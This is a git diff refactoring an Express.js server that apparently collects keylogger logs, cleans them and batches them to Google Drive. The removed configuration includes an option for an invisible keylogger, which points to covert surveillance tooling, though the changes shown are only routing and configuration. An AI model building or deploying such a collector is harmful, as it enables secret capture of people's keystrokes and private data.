@@ -1,40 +1,23 @@
 import express from "express";
-import dayjs from "dayjs";
 import cors from 'cors'
-import dotenv from "dotenv";
-import GoogleDriveService from "./util/googleDrive.js";
+import { SERVER_CONFIG, configValues } from './config.js';
 import BatchProcessor from "./util/batchProcessor.js";
 import {processKeyloggerData} from "./util/cleanRawLogs.js";
 import connectDB from "./util/database.js";
 import userRoutes from './router/userRoutes.js';
+import driveRoutes from './router/driveRoutes.js';
 
-dotenv.config({});
-
-const app = express();
-
-const configValues = {
-        format : 0, // 0 = labels, 10 = decimal, 16 = hex
-        visible :  true, // true = VISIBLE, false = INVISIBLE
-        boot_wait : true, // true = BOOT_WAIT, false = NOWAIT
-        mouse_ignore : true, // true = ignore mouse clicks
-        serverName : "localhost",
-        resource : "/",
-        intervalMinutes : 2,  // Minutes
-        log_file_name : "keylogger.log",
-        backend_port : 8000,
-}
-
-export const root_folder = "1c-6HpFy91j6GWOwNrMON7BW0pHv7evFM"; 
-
-// The Google Drive service is initialized inside this batchProcessor's constructor automatically
-const batchProcessor = new BatchProcessor();
+export const app = express();
 
 // Middleware with increased body size limit
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+app.use(express.json({ limit: SERVER_CONFIG.bodyLimit }));
+app.use(express.urlencoded({ extended: true, limit: SERVER_CONFIG.bodyLimit }));
 
 // allow all origins
 app.use(cors());
+
+// The Google Drive service is initialized inside this batchProcessor's constructor automatically
+const batchProcessor = new BatchProcessor();
 
 // check backend working
 app.get("/", (req, res) => {
@@ -76,15 +59,15 @@ app.post("/", async (req, res) => {
 });
 
 app.use('/api/users', userRoutes);
+app.use('/api/drive', driveRoutes);
 
 // Start the server
-const PORT = process.env.PORT || 8000;
-app.listen(PORT, async () => {
+app.listen(SERVER_CONFIG.port, async () => {
     try {
         // connect to mongoDB
         await connectDB();
         // Server UP and running smooth
-        console.log(`Server running at port ${PORT}`);
+        console.log(`Server running at port ${SERVER_CONFIG.port}`);
     } catch (err) {
         console.error('Failed to start server:', err);
         process.exit(1);
